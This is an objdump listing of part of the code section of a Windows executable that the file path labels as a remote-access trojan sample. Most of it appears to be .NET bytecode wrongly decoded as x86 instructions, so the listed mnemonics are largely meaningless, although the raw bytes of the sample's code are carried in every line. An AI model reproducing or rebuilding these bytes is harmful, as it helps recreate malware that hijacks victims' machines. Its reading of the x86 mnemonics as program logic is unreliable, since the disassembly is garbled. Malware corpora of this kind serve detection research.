
malware_samples/rat/d3bb6eb48a3fe9e88970bec3c3ac03a0631d9e1bbb06fc4b4bf675e1d70405ce.exe:     file format pei-i386


Disassembly of section .text:

00402000 <.text>:
  402000:	e0 80                	loopne 0x401f82
  402002:	00 00                	add    %al,(%eax)
  402004:	00 00                	add    %al,(%eax)
  402006:	00 00                	add    %al,(%eax)
  402008:	48                   	dec    %eax
  402009:	00 00                	add    %al,(%eax)
  40200b:	00 02                	add    %al,(%edx)
  40200d:	00 05 00 18 43 00    	add    %al,0x431800
  402013:	00 20                	add    %ah,(%eax)
  402015:	3d 00 00 03 00       	cmp    $0x30000,%eax
  40201a:	00 00                	add    %al,(%eax)
  40201c:	01 00                	add    %eax,(%eax)
  40201e:	00 06                	add    %al,(%esi)
	...
  402050:	1b 30                	sbb    (%eax),%esi
  402052:	02 00                	add    (%eax),%al
  402054:	e2 00                	loop   0x402056
  402056:	00 00                	add    %al,(%eax)
  402058:	01 00                	add    %eax,(%eax)
  40205a:	00 11                	add    %dl,(%ecx)
  40205c:	00 16                	add    %dl,(%esi)
  40205e:	0a 2b                	or     (%ebx),%ch
  402060:	11 00                	adc    %eax,(%eax)
  402062:	20 e8                	and    %ch,%al
  402064:	03 00                	add    (%eax),%eax
  402066:	00 28                	add    %ch,(%eax)
  402068:	10 00                	adc    %al,(%eax)
  40206a:	00 0a                	add    %cl,(%edx)
  40206c:	00 00                	add    %al,(%eax)
  40206e:	06                   	push   %es
  40206f:	17                   	pop    %ss
  402070:	58                   	pop    %eax
  402071:	0a 06                	or     (%esi),%al
  402073:	7e 11                	jle    0x402086
  402075:	00 00                	add    %al,(%eax)
  402077:	04 28                	add    $0x28,%al
  402079:	11 00                	adc    %eax,(%eax)
  40207b:	00 0a                	add    %cl,(%edx)
  40207d:	fe 04 0b             	incb   (%ebx,%ecx,1)
  402080:	07                   	pop    %es
  402081:	2d de 28 03 00       	sub    $0x328de,%eax
  402086:	00 06                	add    %al,(%esi)
  402088:	16                   	push   %ss
  402089:	fe 01                	incb   (%ecx)
  40208b:	0c 08                	or     $0x8,%al
  40208d:	2c 07                	sub    $0x7,%al
  40208f:	16                   	push   %ss
  402090:	28 12                	sub    %dl,(%edx)
  402092:	00 00                	add    %al,(%eax)
  402094:	0a 00                	or     (%eax),%al
  402096:	00 00                	add    %al,(%eax)
  402098:	28 36                	sub    %dh,(%esi)
  40209a:	00 00                	add    %al,(%eax)
  40209c:	06                   	push   %es
  40209d:	16                   	push   %ss
  40209e:	fe 01                	incb   (%ecx)
  4020a0:	0d 09 2c 07 16       	or     $0x16072c09,%eax
  4020a5:	28 12                	sub    %dl,(%edx)
  4020a7:	00 00                	add    %al,(%eax)
  4020a9:	0a 00                	or     (%eax),%al
  4020ab:	7e 0c                	jle    0x4020b9
  4020ad:	00 00                	add    %al,(%eax)
  4020af:	04 28                	add    $0x28,%al
  4020b1:	13 00                	adc    (%eax),%eax
  4020b3:	00 0a                	add    %cl,(%edx)
  4020b5:	13 04 11             	adc    (%ecx,%edx,1),%eax
  4020b8:	04 2c                	add    $0x2c,%al
  4020ba:	06                   	push   %es
  4020bb:	28 26                	sub    %ah,(%esi)
  4020bd:	00 00                	add    %al,(%eax)
  4020bf:	06                   	push   %es
  4020c0:	00 7e 04             	add    %bh,0x4(%esi)
  4020c3:	00 00                	add    %al,(%eax)
  4020c5:	04 28                	add    $0x28,%al
  4020c7:	13 00                	adc    (%eax),%eax
  4020c9:	00 0a                	add    %cl,(%edx)
  4020cb:	13 05 11 05 2c 06    	adc    0x62c0511,%eax
  4020d1:	28 24 00             	sub    %ah,(%eax,%eax,1)
  4020d4:	00 06                	add    %al,(%esi)
  4020d6:	00 7e 0f             	add    %bh,0xf(%esi)
  4020d9:	00 00                	add    %al,(%eax)
  4020db:	04 28                	add    $0x28,%al
  4020dd:	13 00                	adc    (%eax),%eax
  4020df:	00 0a                	add    %cl,(%edx)
  4020e1:	2c 07                	sub    $0x7,%al
  4020e3:	28 30                	sub    %dh,(%eax)
  4020e5:	00 00                	add    %al,(%eax)
  4020e7:	06                   	push   %es
  4020e8:	2b 01                	sub    (%ecx),%eax
  4020ea:	16                   	push   %ss
  4020eb:	13 06                	adc    (%esi),%eax
  4020ed:	11 06                	adc    %eax,(%esi)
  4020ef:	2c 06                	sub    $0x6,%al
  4020f1:	28 3f                	sub    %bh,(%edi)
  4020f3:	00 00                	add    %al,(%eax)
  4020f5:	06                   	push   %es
  4020f6:	00 28                	add    %ch,(%eax)
  4020f8:	34 00                	xor    $0x0,%al
  4020fa:	00 06                	add    %al,(%esi)
  4020fc:	00 00                	add    %al,(%eax)
  4020fe:	de 05 26 00 00 de    	fiadds 0xde000026
  402104:	00 2b                	add    %ch,(%ebx)
  402106:	32 00                	xor    (%eax),%al
  402108:	00 28                	add    %ch,(%eax)
  40210a:	12 00                	adc    (%eax),%al
  40210c:	00 06                	add    %al,(%esi)
  40210e:	16                   	push   %ss
  40210f:	fe 01                	incb   (%ecx)
  402111:	13 07                	adc    (%edi),%eax
  402113:	11 07                	adc    %eax,(%edi)
  402115:	2c 0e                	sub    $0xe,%al
  402117:	00 28                	add    %ch,(%eax)
  402119:	1e                   	push   %ds
  40211a:	00 00                	add    %al,(%eax)
  40211c:	06                   	push   %es
  40211d:	00 28                	add    %ch,(%eax)
  40211f:	1b 00                	sbb    (%eax),%eax
  402121:	00 06                	add    %al,(%esi)
  402123:	00 00                	add    %al,(%eax)
  402125:	00 de                	add    %bl,%dh
  402127:	05 26 00 00 de       	add    $0xde000026,%eax
  40212c:	00 20                	add    %ah,(%eax)
  40212e:	88 13                	mov    %dl,(%ebx)
  402130:	00 00                	add    %al,(%eax)
  402132:	28 10                	sub    %dl,(%eax)
  402134:	00 00                	add    %al,(%eax)
  402136:	0a 00                	or     (%eax),%al
  402138:	00 17                	add    %dl,(%edi)
  40213a:	13 08                	adc    (%eax),%ecx
  40213c:	2b c9                	sub    %ecx,%ecx
  40213e:	00 00                	add    %al,(%eax)
  402140:	01 1c 00             	add    %ebx,(%eax,%eax,1)
  402143:	00 00                	add    %al,(%eax)
  402145:	00 3b                	add    %bh,(%ebx)
  402147:	00 69 a4             	add    %ch,-0x5c(%ecx)
  40214a:	00 05 0f 00 00 01    	add    %al,0x100000f
  402150:	00 00                	add    %al,(%eax)
  402152:	ac                   	lods   %ds:(%esi),%al
  402153:	00 20                	add    %ah,(%eax)
  402155:	cc                   	int3
  402156:	00 05 0f 00 00 01    	add    %al,0x100000f
  40215c:	22 02                	and    (%edx),%al
  40215e:	28 14 00             	sub    %dl,(%eax,%eax,1)
  402161:	00 0a                	add    %cl,(%edx)
  402163:	00 2a                	add    %ch,(%edx)
  402165:	00 00                	add    %al,(%eax)
  402167:	00 13                	add    %dl,(%ebx)
  402169:	30 02                	xor    %al,(%edx)
  40216b:	00 07                	add    %al,(%edi)
  40216d:	00 00                	add    %al,(%eax)
  40216f:	00 02                	add    %al,(%edx)
  402171:	00 00                	add    %al,(%eax)
  402173:	11 00                	adc    %eax,(%eax)
  402175:	17                   	pop    %ss
  402176:	0a 2b                	or     (%ebx),%ch
  402178:	00 06                	add    %al,(%esi)
  40217a:	2a 00                	sub    (%eax),%al
  40217c:	1b 30                	sbb    (%eax),%esi
  40217e:	04 00                	add    $0x0,%al
  402180:	50                   	push   %eax
  402181:	00 00                	add    %al,(%eax)
  402183:	00 03                	add    %al,(%ebx)
  402185:	00 00                	add    %al,(%eax)
  402187:	11 00                	adc    %eax,(%eax)
  402189:	00 7e 0b             	add    %bh,0xb(%esi)
  40218c:	00 00                	add    %al,(%eax)
  40218e:	04 6f                	add    $0x6f,%al
  402190:	15 00 00 0a 6f       	adc    $0x6f0a0000,%eax
  402195:	16                   	push   %ss
  402196:	00 00                	add    %al,(%eax)
  402198:	0a 74 11 00          	or     0x0(%ecx,%edx,1),%dh
  40219c:	00 01                	add    %al,(%ecx)
  40219e:	0a 06                	or     (%esi),%al
  4021a0:	28 17                	sub    %dl,(%edi)
  4021a2:	00 00                	add    %al,(%eax)
  4021a4:	0a 7e 07             	or     0x7(%esi),%bh
  4021a7:	00 00                	add    %al,(%eax)
  4021a9:	04 6f                	add    $0x6f,%al
  4021ab:	18 00                	sbb    %al,(%eax)
  4021ad:	00 0a                	add    %cl,(%edx)
  4021af:	28 53 00             	sub    %dl,0x0(%ebx)
  4021b2:	00 06                	add    %al,(%esi)
  4021b4:	72 01                	jb     0x4021b7
  4021b6:	00 00                	add    %al,(%eax)
  4021b8:	70 28                	jo     0x4021e2
  4021ba:	19 00                	sbb    %eax,(%eax)
  4021bc:	00 0a                	add    %cl,(%edx)
  4021be:	7e 0a                	jle    0x4021ca
  4021c0:	00 00                	add    %al,(%eax)
  4021c2:	04 28                	add    $0x28,%al
  4021c4:	1a 00                	sbb    (%eax),%al
  4021c6:	00 0a                	add    %cl,(%edx)
  4021c8:	6f                   	outsl  %ds:(%esi),(%dx)
  4021c9:	1b 00                	sbb    (%eax),%eax
  4021cb:	00 0a                	add    %cl,(%edx)
  4021cd:	0b de                	or     %esi,%ebx
  4021cf:	06                   	push   %es
  4021d0:	26 00 16             	add    %dl,%es:(%esi)
  4021d3:	0b de                	or     %esi,%ebx
  4021d5:	00 07                	add    %al,(%edi)
  4021d7:	2a 01                	sub    (%ecx),%al
  4021d9:	10 00                	adc    %al,(%eax)
  4021db:	00 00                	add    %al,(%eax)
  4021dd:	00 01                	add    %al,(%ecx)
  4021df:	00 47 48             	add    %al,0x48(%edi)
  4021e2:	00 06                	add    %al,(%esi)
  4021e4:	12 00                	adc    (%eax),%al
  4021e6:	00 01                	add    %al,(%ecx)
  4021e8:	13 30                	adc    (%eax),%esi
  4021ea:	01 00                	add    %eax,(%eax)
  4021ec:	b0 00                	mov    $0x0,%al
  4021ee:	00 00                	add    %al,(%eax)
  4021f0:	00 00                	add    %al,(%eax)
  4021f2:	00 00                	add    %al,(%eax)
  4021f4:	72 0f                	jb     0x402205
  4021f6:	00 00                	add    %al,(%eax)
  4021f8:	70 80                	jo     0x40217a
  4021fa:	01 00                	add    %eax,(%eax)
  4021fc:	00 04 72             	add    %al,(%edx,%esi,2)
  4021ff:	17                   	pop    %ss
  402200:	00 00                	add    %al,(%eax)
  402202:	70 80                	jo     0x402184
  402204:	02 00                	add    (%eax),%al
  402206:	00 04 72             	add    %al,(%edx,%esi,2)
  402209:	2f                   	das
  40220a:	00 00                	add    %al,(%eax)
  40220c:	70 80                	jo     0x40218e
  40220e:	03 00                	add    (%eax),%eax
  402210:	00 04 72             	add    %al,(%edx,%esi,2)
  402213:	3d 00 00 70 80       	cmp    $0x80700000,%eax
  402218:	04 00                	add    $0x0,%al
  40221a:	00 04 72             	add    %al,(%edx,%esi,2)
  40221d:	49                   	dec    %ecx
  40221e:	00 00                	add    %al,(%eax)
  402220:	70 80                	jo     0x4021a2
  402222:	05 00 00 04 72       	add    $0x72040000,%eax
  402227:	59                   	pop    %ecx
  402228:	00 00                	add    %al,(%eax)
  40222a:	70 80                	jo     0x4021ac
  40222c:	06                   	push   %es
  40222d:	00 00                	add    %al,(%eax)
  40222f:	04 72                	add    $0x72,%al
  402231:	6b 00 00             	imul   $0x0,(%eax),%eax
  402234:	70 80                	jo     0x4021b6
  402236:	07                   	pop    %es
  402237:	00 00                	add    %al,(%eax)
  402239:	04 72                	add    $0x72,%al
  40223b:	7d 00                	jge    0x40223d
  40223d:	00 70 80             	add    %dh,-0x80(%eax)
  402240:	08 00                	or     %al,(%eax)
  402242:	00 04 72             	add    %al,(%edx,%esi,2)
  402245:	89 00                	mov    %eax,(%eax)
  402247:	00 70 80             	add    %dh,-0x80(%eax)
  40224a:	09 00                	or     %eax,(%eax)
  40224c:	00 04 72             	add    %al,(%edx,%esi,2)
  40224f:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  402250:	00 00                	add    %al,(%eax)
  402252:	70 80                	jo     0x4021d4
  402254:	0a 00                	or     (%eax),%al
  402256:	00 04 72             	add    %al,(%edx,%esi,2)
  402259:	3d 00 00 70 80       	cmp    $0x80700000,%eax
  40225e:	0c 00                	or     $0x0,%al
  402260:	00 04 7e             	add    %al,(%esi,%edi,2)
  402263:	07                   	pop    %es
  402264:	00 00                	add    %al,(%eax)
  402266:	04 73                	add    $0x73,%al
  402268:	4b                   	dec    %ebx
  402269:	00 00                	add    %al,(%eax)
  40226b:	06                   	push   %es
  40226c:	80 0d 00 00 04 72 c9 	orb    $0xc9,0x72040000
  402273:	00 00                	add    %al,(%eax)
  402275:	70 80                	jo     0x4021f7
  402277:	0e                   	push   %cs
  402278:	00 00                	add    %al,(%eax)
  40227a:	04 72                	add    $0x72,%al
  40227c:	3d 00 00 70 80       	cmp    $0x80700000,%eax
  402281:	0f 00 00             	sldt   (%eax)
  402284:	04 28                	add    $0x28,%al
  402286:	2d 00 00 06 80       	sub    $0x80060000,%eax
  40228b:	10 00                	adc    %al,(%eax)
  40228d:	00 04 72             	add    %al,(%edx,%esi,2)
  402290:	d3 00                	roll   %cl,(%eax)
  402292:	00 70 80             	add    %dh,-0x80(%eax)
  402295:	11 00                	adc    %eax,(%eax)
  402297:	00 04 72             	add    %al,(%edx,%esi,2)
  40229a:	d7                   	xlat   %ds:(%ebx)
  40229b:	00 00                	add    %al,(%eax)
  40229d:	70 80                	jo     0x40221f
  40229f:	12 00                	adc    (%eax),%al
  4022a1:	00 04 2a             	add    %al,(%edx,%ebp,1)
  4022a4:	1a 7e 13             	sbb    0x13(%esi),%bh
  4022a7:	00 00                	add    %al,(%eax)
  4022a9:	04 2a                	add    $0x2a,%al
  4022ab:	1e                   	push   %ds
  4022ac:	02 80 13 00 00 04    	add    0x4000013(%eax),%al
  4022b2:	2a 1a                	sub    (%edx),%bl
  4022b4:	7e 14                	jle    0x4022ca
  4022b6:	00 00                	add    %al,(%eax)
  4022b8:	04 2a                	add    $0x2a,%al
  4022ba:	1e                   	push   %ds
  4022bb:	02 80 14 00 00 04    	add    0x4000014(%eax),%al
  4022c1:	2a 1a                	sub    (%edx),%bl
  4022c3:	7e 15                	jle    0x4022da
  4022c5:	00 00                	add    %al,(%eax)
  4022c7:	04 2a                	add    $0x2a,%al
  4022c9:	1e                   	push   %ds
  4022ca:	02 80 15 00 00 04    	add    0x4000015(%eax),%al
  4022d0:	2a 1a                	sub    (%edx),%bl
  4022d2:	7e 16                	jle    0x4022ea
  4022d4:	00 00                	add    %al,(%eax)
  4022d6:	04 2a                	add    $0x2a,%al
  4022d8:	1e                   	push   %ds
  4022d9:	02 80 16 00 00 04    	add    0x4000016(%eax),%al
  4022df:	2a 1a                	sub    (%edx),%bl
  4022e1:	7e 17                	jle    0x4022fa
  4022e3:	00 00                	add    %al,(%eax)
  4022e5:	04 2a                	add    $0x2a,%al
  4022e7:	1e                   	push   %ds
  4022e8:	02 80 17 00 00 04    	add    0x4000017(%eax),%al
  4022ee:	2a 1a                	sub    (%edx),%bl
  4022f0:	7e 18                	jle    0x40230a
  4022f2:	00 00                	add    %al,(%eax)
  4022f4:	04 2a                	add    $0x2a,%al
  4022f6:	1e                   	push   %ds
  4022f7:	02 80 18 00 00 04    	add    0x4000018(%eax),%al
  4022fd:	2a 1a                	sub    (%edx),%bl
  4022ff:	7e 19                	jle    0x40231a
  402301:	00 00                	add    %al,(%eax)
  402303:	04 2a                	add    $0x2a,%al
  402305:	1e                   	push   %ds
  402306:	02 80 19 00 00 04    	add    0x4000019(%eax),%al
  40230c:	2a 1a                	sub    (%edx),%bl
  40230e:	7e 1a                	jle    0x40232a
  402310:	00 00                	add    %al,(%eax)
  402312:	04 2a                	add    $0x2a,%al
  402314:	1a 7e 1b             	sbb    0x1b(%esi),%bh
  402317:	00 00                	add    %al,(%eax)
  402319:	04 2a                	add    $0x2a,%al
  40231b:	1e                   	push   %ds
  40231c:	02 80 1b 00 00 04    	add    0x400001b(%eax),%al
  402322:	2a 1a                	sub    (%edx),%bl
  402324:	7e 1c                	jle    0x402342
  402326:	00 00                	add    %al,(%eax)
  402328:	04 2a                	add    $0x2a,%al
  40232a:	1e                   	push   %ds
  40232b:	02 80 1c 00 00 04    	add    0x400001c(%eax),%al
  402331:	2a 1a                	sub    (%edx),%bl
  402333:	7e 1d                	jle    0x402352
  402335:	00 00                	add    %al,(%eax)
  402337:	04 2a                	add    $0x2a,%al
  402339:	1e                   	push   %ds
  40233a:	02 80 1d 00 00 04    	add    0x400001d(%eax),%al
  402340:	2a 00                	sub    (%eax),%al
  402342:	00 00                	add    %al,(%eax)
  402344:	1b 30                	sbb    (%eax),%esi
  402346:	07                   	pop    %es
  402347:	00 1e                	add    %bl,(%esi)
  402349:	03 00                	add    (%eax),%eax
  40234b:	00 04 00             	add    %al,(%eax,%eax,1)
  40234e:	00 11                	add    %dl,(%ecx)
  402350:	00 00                	add    %al,(%eax)
  402352:	18 17                	sbb    %dl,(%edi)
  402354:	1c 73                	sbb    $0x73,%al
  402356:	1c 00                	sbb    $0x0,%al
  402358:	00 0a                	add    %cl,(%edx)
  40235a:	25 20 00 c8 00       	and    $0xc80020,%eax
  40235f:	00 6f 1d             	add    %ch,0x1d(%edi)
  402362:	00 00                	add    %al,(%eax)
  402364:	0a 00                	or     (%eax),%al
  402366:	25 20 00 c8 00       	and    $0xc80020,%eax
  40236b:	00 6f 1e             	add    %ch,0x1e(%edi)
  40236e:	00 00                	add    %al,(%eax)
  402370:	0a 00                	or     (%eax),%al
  402372:	28 07                	sub    %al,(%edi)
  402374:	00 00                	add    %al,(%eax)
  402376:	06                   	push   %es
  402377:	00 7e 0e             	add    %bh,0xe(%esi)
  40237a:	00 00                	add    %al,(%eax)
  40237c:	04 72                	add    $0x72,%al
  40237e:	c9                   	leave
  40237f:	00 00                	add    %al,(%eax)
  402381:	70 28                	jo     0x4023ab
  402383:	1f                   	pop    %ds
  402384:	00 00                	add    %al,(%eax)
  402386:	0a 0a                	or     (%edx),%cl
  402388:	06                   	push   %es
  402389:	39 eb                	cmp    %ebp,%ebx
  40238b:	00 00                	add    %al,(%eax)
  40238d:	00 00                	add    %al,(%eax)
  40238f:	7e 02                	jle    0x402393
  402391:	00 00                	add    %al,(%eax)
  402393:	04 17                	add    $0x17,%al
  402395:	8d 4c 00 00          	lea    0x0(%eax,%eax,1),%ecx
  402399:	01 25 16 1f 2c 9d    	add    %esp,0x9d2c1f16
  40239f:	6f                   	outsl  %ds:(%esi),(%dx)
  4023a0:	20 00                	and    %al,(%eax)
  4023a2:	00 0a                	add    %cl,(%edx)
  4023a4:	73 21                	jae    0x4023c7
  4023a6:	00 00                	add    %al,(%eax)
  4023a8:	0a 7e 02             	or     0x2(%esi),%bh
  4023ab:	00 00                	add    %al,(%eax)
  4023ad:	04 17                	add    $0x17,%al
  4023af:	8d 4c 00 00          	lea    0x0(%eax,%eax,1),%ecx
  4023b3:	01 25 16 1f 2c 9d    	add    %esp,0x9d2c1f16
  4023b9:	6f                   	outsl  %ds:(%esi),(%dx)
  4023ba:	20 00                	and    %al,(%eax)
  4023bc:	00 0a                	add    %cl,(%edx)
  4023be:	8e 69 6f             	mov    0x6f(%ecx),%gs
  4023c1:	22 00                	and    (%eax),%al
  4023c3:	00 0a                	add    %cl,(%edx)
  4023c5:	9a 0b 7e 01 00 00 04 	lcall  $0x400,$0x17e0b
  4023cc:	17                   	pop    %ss
  4023cd:	8d 4c 00 00          	lea    0x0(%eax,%eax,1),%ecx
  4023d1:	01 25 16 1f 2c 9d    	add    %esp,0x9d2c1f16
  4023d7:	6f                   	outsl  %ds:(%esi),(%dx)
  4023d8:	20 00                	and    %al,(%eax)
  4023da:	00 0a                	add    %cl,(%edx)
  4023dc:	73 21                	jae    0x4023ff
  4023de:	00 00                	add    %al,(%eax)
  4023e0:	0a 7e 01             	or     0x1(%esi),%bh
  4023e3:	00 00                	add    %al,(%eax)
  4023e5:	04 17                	add    $0x17,%al
  4023e7:	8d 4c 00 00          	lea    0x0(%eax,%eax,1),%ecx
  4023eb:	01 25 16 1f 2c 9d    	add    %esp,0x9d2c1f16
  4023f1:	6f                   	outsl  %ds:(%esi),(%dx)
  4023f2:	20 00                	and    %al,(%eax)
  4023f4:	00 0a                	add    %cl,(%edx)
  4023f6:	8e 69 6f             	mov    0x6f(%ecx),%gs
  4023f9:	22 00                	and    (%eax),%al
  4023fb:	00 0a                	add    %cl,(%edx)
  4023fd:	9a 28 11 00 00 0a 0c 	lcall  $0xc0a,$0x1128
  402404:	07                   	pop    %es
  402405:	28 1c 00             	sub    %bl,(%eax,%eax,1)
  402408:	00 06                	add    %al,(%esi)
  40240a:	0d 09 2c 56 00       	or     $0x562c09,%eax
  40240f:	07                   	pop    %es
  402410:	28 23                	sub    %ah,(%ebx)
  402412:	00 00                	add    %al,(%eax)
  402414:	0a 13                	or     (%ebx),%dl
  402416:	04 00                	add    $0x0,%al
  402418:	11 04 13             	adc    %eax,(%ebx,%edx,1)
  40241b:	05 16 13 06 2b       	add    $0x2b061316,%eax
  402420:	38 11                	cmp    %dl,(%ecx)
  402422:	05 11 06 9a 13       	add    $0x139a0611,%eax
  402427:	07                   	pop    %es
  402428:	00 00                	add    %al,(%eax)
  40242a:	28 06                	sub    %al,(%esi)
  40242c:	00 00                	add    %al,(%eax)
  40242e:	06                   	push   %es
  40242f:	11 07                	adc    %eax,(%edi)
  402431:	08 6f 24             	or     %ch,0x24(%edi)
  402434:	00 00                	add    %al,(%eax)
  402436:	0a 00                	or     (%eax),%al
  402438:	28 06                	sub    %al,(%esi)
  40243a:	00 00                	add    %al,(%eax)
  40243c:	06                   	push   %es
  40243d:	6f                   	outsl  %ds:(%esi),(%dx)
  40243e:	25 00 00 0a 13       	and    $0x130a0000,%eax
  402443:	08 11                	or     %dl,(%ecx)
  402445:	08 2c 02             	or     %ch,(%edx,%eax,1)
  402448:	de 17                	ficoms (%edi)
  40244a:	00 de                	add    %bl,%dh
  40244c:	05 26 00 00 de       	add    $0xde000026,%eax
  402451:	00 00                	add    %al,(%eax)
  402453:	11 06                	adc    %eax,(%esi)
  402455:	17                   	pop    %ss
  402456:	58                   	pop    %eax
  402457:	13 06                	adc    (%esi),%eax
  402459:	11 06                	adc    %eax,(%esi)
  40245b:	11 05 8e 69 32 c0    	adc    %eax,0xc032698e
  402461:	00 2b                	add    %ch,(%ebx)
  402463:	0f 00 28             	verw   (%eax)
  402466:	06                   	push   %es
  402467:	00 00                	add    %al,(%eax)
  402469:	06                   	push   %es
  40246a:	07                   	pop    %es
  40246b:	08 6f 26             	or     %ch,0x26(%edi)
  40246e:	00 00                	add    %al,(%eax)
  402470:	0a 00                	or     (%eax),%al
  402472:	00 00                	add    %al,(%eax)
  402474:	38 95 00 00 00 00    	cmp    %dl,0x0(%ebp)
  40247a:	73 27                	jae    0x4024a3
  40247c:	00 00                	add    %al,(%eax)
  40247e:	0a 13                	or     (%ebx),%dl
  402480:	09 00                	or     %eax,(%eax)
  402482:	72 e3                	jb     0x402467
  402484:	00 00                	add    %al,(%eax)
  402486:	70 72                	jo     0x4024fa
  402488:	e3 00                	jecxz  0x40248a
  40248a:	00 70 73             	add    %dh,0x73(%eax)
  40248d:	28 00                	sub    %al,(%eax)
  40248f:	00 0a                	add    %cl,(%edx)
  402491:	13 0a                	adc    (%edx),%ecx
  402493:	11 09                	adc    %ecx,(%ecx)
  402495:	11 0a                	adc    %ecx,(%edx)
  402497:	6f                   	outsl  %ds:(%esi),(%dx)
  402498:	29 00                	sub    %eax,(%eax)
  40249a:	00 0a                	add    %cl,(%edx)
  40249c:	00 11                	add    %dl,(%ecx)
  40249e:	09 7e 0e             	or     %edi,0xe(%esi)
  4024a1:	00 00                	add    %al,(%eax)
  4024a3:	04 6f                	add    $0x6f,%al
  4024a5:	2a 00                	sub    (%eax),%al
  4024a7:	00 0a                	add    %cl,(%edx)
  4024a9:	13 0b                	adc    (%ebx),%ecx
  4024ab:	11 0b                	adc    %ecx,(%ebx)
  4024ad:	17                   	pop    %ss
  4024ae:	8d 4b 00             	lea    0x0(%ebx),%ecx
  4024b1:	00 01                	add    %al,(%ecx)
  4024b3:	25 16 72 e5 00       	and    $0xe57216,%eax
  4024b8:	00 70 a2             	add    %dh,-0x5e(%eax)
  4024bb:	16                   	push   %ss
  4024bc:	6f                   	outsl  %ds:(%esi),(%dx)
  4024bd:	2b 00                	sub    (%eax),%eax
  4024bf:	00 0a                	add    %cl,(%edx)
  4024c1:	13 0c 11             	adc    (%ecx,%edx,1),%ecx
  4024c4:	0c 16                	or     $0x16,%al
  4024c6:	9a 80 02 00 00 04 11 	lcall  $0x1104,$0x280
  4024cd:	0c 73                	or     $0x73,%al
  4024cf:	21 00                	and    %eax,(%eax)
  4024d1:	00 0a                	add    %cl,(%edx)
  4024d3:	17                   	pop    %ss
  4024d4:	11 0c 8e             	adc    %ecx,(%esi,%ecx,4)
  4024d7:	69 6f 2c 00 00 0a 9a 	imul   $0x9a0a0000,0x2c(%edi),%ebp
  4024de:	80 01 00             	addb   $0x0,(%ecx)
  4024e1:	00 04 28             	add    %al,(%eax,%ebp,1)
  4024e4:	06                   	push   %es
  4024e5:	00 00                	add    %al,(%eax)
  4024e7:	06                   	push   %es
  4024e8:	7e 02                	jle    0x4024ec
  4024ea:	00 00                	add    %al,(%eax)
  4024ec:	04 7e                	add    $0x7e,%al
  4024ee:	01 00                	add    %eax,(%eax)
  4024f0:	00 04 28             	add    %al,(%eax,%ebp,1)
  4024f3:	11 00                	adc    %eax,(%eax)
  4024f5:	00 0a                	add    %cl,(%edx)
  4024f7:	6f                   	outsl  %ds:(%esi),(%dx)
  4024f8:	26 00 00             	add    %al,%es:(%eax)
  4024fb:	0a 00                	or     (%eax),%al
  4024fd:	00 de                	add    %bl,%dh
  4024ff:	0d 11 09 2c 08       	or     $0x82c0911,%eax
  402504:	11 09                	adc    %ecx,(%ecx)
  402506:	6f                   	outsl  %ds:(%esi),(%dx)
  402507:	2d 00 00 0a 00       	sub    $0xa0000,%eax
  40250c:	dc 00                	faddl  (%eax)
  40250e:	28 06                	sub    %al,(%esi)
  402510:	00 00                	add    %al,(%eax)
  402512:	06                   	push   %es
  402513:	6f                   	outsl  %ds:(%esi),(%dx)
  402514:	25 00 00 0a 13       	and    $0x130a0000,%eax
  402519:	0d 11 0d 39 29       	or     $0x29390d11,%eax
  40251e:	01 00                	add    %eax,(%eax)
  402520:	00 00                	add    %al,(%eax)
  402522:	72 e9                	jb     0x40250d
  402524:	00 00                	add    %al,(%eax)
  402526:	70 28                	jo     0x402550
  402528:	2e 00 00             	add    %al,%cs:(%eax)
  40252b:	0a 00                	or     (%eax),%al
  40252d:	17                   	pop    %ss
  40252e:	28 13                	sub    %dl,(%ebx)
  402530:	00 00                	add    %al,(%eax)
  402532:	06                   	push   %es
  402533:	00 28                	add    %ch,(%eax)
  402535:	06                   	push   %es
  402536:	00 00                	add    %al,(%eax)
  402538:	06                   	push   %es
  402539:	17                   	pop    %ss
  40253a:	73 2f                	jae    0x40256b
  40253c:	00 00                	add    %al,(%eax)
  40253e:	0a 16                	or     (%esi),%dl
  402540:	14 fe                	adc    $0xfe,%al
  402542:	06                   	push   %es
  402543:	1d 00 00 06 73       	sbb    $0x73060000,%eax
  402548:	30 00                	xor    %al,(%eax)
  40254a:	00 0a                	add    %cl,(%edx)
  40254c:	73 31                	jae    0x40257f
  40254e:	00 00                	add    %al,(%eax)
  402550:	0a 28                	or     (%eax),%ch
  402552:	09 00                	or     %eax,(%eax)
  402554:	00 06                	add    %al,(%esi)
  402556:	00 28                	add    %ch,(%eax)
  402558:	08 00                	or     %al,(%eax)
  40255a:	00 06                	add    %al,(%esi)
  40255c:	28 06                	sub    %al,(%esi)
  40255e:	00 00                	add    %al,(%eax)
  402560:	06                   	push   %es
  402561:	6f                   	outsl  %ds:(%esi),(%dx)
  402562:	32 00                	xor    (%eax),%al
  402564:	00 0a                	add    %cl,(%edx)
  402566:	6f                   	outsl  %ds:(%esi),(%dx)
  402567:	33 00                	xor    (%eax),%eax
  402569:	00 0a                	add    %cl,(%edx)
  40256b:	17                   	pop    %ss
  40256c:	8d 4c 00 00          	lea    0x0(%eax,%eax,1),%ecx
  402570:	01 25 16 1f 3a 9d    	add    %esp,0x9d3a1f16
  402576:	6f                   	outsl  %ds:(%esi),(%dx)
  402577:	20 00                	and    %al,(%eax)
  402579:	00 0a                	add    %cl,(%edx)
  40257b:	16                   	push   %ss
  40257c:	9a 14 20 c0 00 00 00 	lcall  $0x0,$0xc02014
  402583:	16                   	push   %ss
  402584:	6f                   	outsl  %ds:(%esi),(%dx)
  402585:	34 00                	xor    $0x0,%al
  402587:	00 0a                	add    %cl,(%edx)
  402589:	00 1a                	add    %bl,(%edx)
  40258b:	6a 28                	push   $0x28
  40258d:	0d 00 00 06 00       	or     $0x60000,%eax
  402592:	28 0c 00             	sub    %cl,(%eax,%eax,1)
  402595:	00 06                	add    %al,(%esi)
  402597:	d4 8d                	aam    $0x8d
  402599:	59                   	pop    %ecx
  40259a:	00 00                	add    %al,(%eax)
  40259c:	01 28                	add    %ebp,(%eax)
  40259e:	0b 00                	or     (%eax),%eax
  4025a0:	00 06                	add    %al,(%esi)
  4025a2:	00 16                	add    %dl,(%esi)
  4025a4:	6a 28                	push   $0x28
  4025a6:	0f 00 00             	sldt   (%eax)
  4025a9:	06                   	push   %es
  4025aa:	00 28                	add    %ch,(%eax)
  4025ac:	2f                   	das
  4025ad:	00 00                	add    %al,(%eax)
  4025af:	06                   	push   %es
  4025b0:	28 20                	sub    %ah,(%eax)
  4025b2:	00 00                	add    %al,(%eax)
  4025b4:	06                   	push   %es
  4025b5:	00 16                	add    %dl,(%esi)
  4025b7:	28 18                	sub    %bl,(%eax)
  4025b9:	00 00                	add    %al,(%eax)
